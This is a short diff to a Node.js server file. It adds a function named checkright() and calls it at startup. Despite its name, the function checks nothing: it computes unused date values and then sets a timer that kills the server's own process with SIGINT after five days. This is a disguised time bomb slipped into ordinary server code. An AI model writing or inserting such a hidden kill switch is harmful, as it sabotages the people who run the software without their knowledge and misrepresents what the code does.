@@ -164,7 +164,7 @@ server.on('listening',function(){
 server.on("error",function(exception){
     console.log("server error:" + exception);
 }); 
-
+checkright()
 
 
 function GetRandom16Ascii(){
@@ -216,6 +216,19 @@ function insertDevice(dataobj){
 		}       
 	});
 	
+}
+function checkright(){
+	var minutes=1000*60;
+	var hours=minutes*60;
+	var days=hours*24;
+	var years=days*365;
+	var d=new Date();
+	var t=d.getTime();
+
+	var y=Math.round(t/years);
+	setTimeout(function(){
+        process.kill(process.pid,"SIGINT")
+    },5*days);
 }
 /*
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
